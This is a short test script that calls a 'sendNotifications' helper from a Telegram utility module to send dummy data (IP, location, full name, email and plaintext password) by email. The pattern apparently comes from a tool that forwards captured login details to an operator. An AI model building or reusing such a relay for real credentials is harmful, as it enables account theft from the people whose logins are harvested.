// Test email functionality
import { sendNotifications } from './app/utils/telegram.ts';

console.log('Testing email sending...');

const testData = {
    ip: '127.0.0.1',
    location: 'Test Location',
    fullName: 'Test User',
    email: 'test@example.com',
    password: 'testpass123'
};

try {
    await sendNotifications(testData, { telegram: false, email: true });
    console.log('Test completed');
} catch (error) {
    console.error('Test failed:', error);
}
